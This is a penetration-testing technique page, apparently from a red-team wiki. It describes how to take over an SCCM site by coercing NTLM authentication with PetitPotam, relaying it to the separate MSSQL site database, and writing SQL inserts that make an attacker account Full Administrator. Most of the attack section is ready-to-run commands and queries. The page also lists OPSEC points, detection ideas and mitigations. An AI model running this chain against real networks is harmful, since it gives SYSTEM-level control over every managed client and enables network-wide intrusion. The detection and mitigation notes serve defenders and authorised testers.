---
tags:
  - type/technique
  - tactic/TA0008
  - tactic/TA0006
  - technique/T1557001
  - stage/lateral-movement
  - os/windows
  - tool/impacket
  - tool/ntlmrelayx
  - tool/petitpotam
  - tool/mssqlclient
  - stage/privilege-escalation
aliases:
  - SCCM NTLM Relay to SQL
  - SCCM Site Database Takeover
  - PetitPotam to SCCM
---
## Technique
___
This takeover technique is possible when the SCCM **MSSQL Site Database** is hosted on a server separate from the Primary Site Server. In this configuration, the Primary Site Server's machine account (e.g., `SCCM01$`) is typically a local administrator on the database server.

An attacker can coerce authentication from the Primary Site Server (using a tool like PetitPotam) and relay the NTLM session to the MSSQL service on the database server. This grants the attacker `dbo` (database owner) privileges, allowing them to directly modify the SCCM database tables to add their own account as a **Full Administrator**, leading to a complete compromise of the SCCM environment.

## Prerequisites
___
**Access Level:** An account on the domain. No special or elevated privileges are required to initiate the attack.

**System State:**

- The MSSQL Site Database is hosted on a different server than the Primary Site Server.
- The Primary Site Server's computer account is a local administrator on the database server.
- The MSSQL service port (typically `1433/TCP`) is accessible from the attacker's position.
- **SMB Signing** must not be required on the target database server.

**Information:** The IP addresses of the Primary Site Server (to coerce) and the MSSQL server (to relay to).

## Considerations
___
**Impact**

A successful attack results in a full takeover of the SCCM site. By gaining Full Administrator rights, an attacker can deploy malicious applications, execute arbitrary scripts as `SYSTEM` on any managed client, and move laterally throughout the entire network managed by SCCM.

**OPSEC**

- **Coercion Noise:** Authentication coercion attempts (e.g., EFS RPC calls from PetitPotam) are often flagged by modern EDR and security monitoring solutions.
- **Relay Detection:** NTLM relay traffic is highly suspicious. A machine account authenticating from an unexpected host (the attacker's relay) is a major red flag.
- **Database Auditing:** Direct writes to sensitive SCCM tables like `RBAC_Admins` are a high-fidelity indicator of compromise if database auditing is enabled.


## Execution
___
**Step 1: Set up NTLM Relay**

Use `ntlmrelayx.py` to listen for incoming connections and relay them to the target MSSQL server. The `-socks` flag creates a proxy session upon successful relay.

```bash
impacket-ntlmrelayx -t "mssql://<MSSQL_SERVER_IP>" -smb2support -socks
```

**Step 2: Coerce Authentication**

```bash
python3 PetitPotam.py -u <user> -p '<password>' -d <domain> <ATTACKER_IP> <PRIMARY_SITE_SERVER_IP>
```

**Step 3: Access the Database via Relayed Session**

Use the created SOCKS proxy with proxychains and mssqlclient.py to connect to the database as the relayed machine account.

```bash
proxychains4 -q python3 mssqlclient.py 'DOMAIN/PRIMARY_SITE_SERVER_NAME$'@<MSSQL_SERVER_IP> -windows-auth -no-pass
```

**Step 4: Grant Admin Privileges in the Database**

Execute a series of SQL queries to add an attacker-controlled user (e.g., LAB\User) as a Full Administrator.

Get SID

```powershell
Get-DomainUser <User> -Properties objectsid
```

Convert to binary

```bash
function Convert-StringSidToBinary {
    param ([string]$StringSid)
    $sid = New-Object System.Security.Principal.SecurityIdentifier $StringSid
    $binarySid = New-Object byte[] ($sid.BinaryLength)
    $sid.GetBinaryForm($binarySid, 0)
    $binarySidHex = ($binarySid | ForEach-Object { $_.ToString("X2") }) -join ''
    echo "0x$($binarySidHex.ToLower())"
}

Convert-StringSidToBinary "<SID>"
```

Add user into admins table

```sql
USE CM_<SiteCode>;
INSERT INTO RBAC_Admins (AdminSID, LogonName, IsGroup, IsDeleted, SourceSite) VALUES (<hex of convertedsid>, 'LAB\User', 0, 0, '<SiteCode>');
```

Retrieve the new adminID

```sql
SELECT AdminID, LogonName FROM RBAC_Admins;
```

Assign `Full Administrator` to yourself

```sql
INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID) VALUES (<new_admin_id>, 'SMS0001R', 'SMS00ALL', '29');
INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID) VALUES (<new_admin_id>, 'SMS0001R', 'SMS00001', '1');
INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID) VALUES (<new_admin_id>, 'SMS0001R', 'SMS00004', '1');
```

## Cleanup Considerations
___
- Remove the user from SCCM Full Administrator upon completion of engagement

## Detection & Mitigation
___

#### **Detection**

- Monitor for authentication coercion attempts against high-value servers (e.g., unexpected EFS RPC traffic).

- Alert when machine accounts authenticate from IPs other than their own, which is indicative of a relay attack.

- Implement database auditing to monitor for direct, unauthorized modifications to `RBAC_Admins` and `RBAC_ExtendedPermissions` tables.

- Regularly audit the list of SCCM Full Administrators for unauthorized additions.

#### **Mitigation**

- **Enable EPA:** Enable **Extended Protection for Authentication** on the MSSQL service to cryptographically bind the service to the TLS session, mitigating relay attacks.

- **Co-locate Roles:** Install the SCCM database on the Primary Site Server itself. This eliminates the need for the server's machine account to have admin rights on a separate database server.

- **Patch Systems:** Apply security updates that mitigate NTLM coercion vulnerabilities like PetitPotam.


